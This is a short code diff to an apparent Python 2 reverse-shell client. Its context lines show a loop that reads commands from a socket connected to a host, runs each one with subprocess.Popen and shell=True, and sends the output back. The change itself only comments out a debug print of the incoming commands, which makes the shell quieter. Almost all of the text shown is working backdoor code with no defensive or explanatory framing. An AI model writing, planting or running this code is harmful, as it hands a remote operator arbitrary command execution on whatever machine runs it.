@@ -15,7 +15,8 @@ def connect(host, port):
 	while True:
 		data = s.recv(1024)
 		if data == "q": break
-		print data
+		# enable printing for debugging
+		#print data
 		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		stdouts = proc.stdout.read() + proc.stderr.read()
 		s.send(stdouts)
